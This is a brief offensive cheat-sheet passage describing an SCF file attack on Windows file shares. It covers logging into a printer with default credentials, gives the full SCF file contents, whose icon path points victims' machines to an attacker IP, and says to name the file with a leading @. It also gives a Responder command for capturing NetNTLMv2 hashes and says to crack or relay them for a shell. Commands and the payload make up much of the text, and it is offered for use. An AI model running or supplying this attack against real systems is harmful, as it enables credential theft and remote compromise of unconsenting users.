Enter to the printer console with creds -> admin:admin
Upload an scf file to get the user connect to your "share" to gather NetNtlmv2 hash as soon as they browse that share.
### SCF attack
An scf file can be planted into a remote file share that requires no authentication and writable.
SCF file should contain this:
```
[Shell]

Command=2
// replace the ip with your own
IconFile=\\192.168.0.12\share\test.ico

[Taskbar]

Command=ToggleDesktop
```
Rename the scf file with the name starting with @ symbol. This will make the scf file to be the first file at the share. And it will be executed as soon as the user visits the share.

From the attacker's machine fire up responder to listen for NetNTLMv2:
```bash
responder -wrf --lm -v -I eth0
```

From there on, you can either crack the hash or relay it with multirelay(if smb singing is disabled) to get shell (you can't relay to the same machine from which you captured the hash.)
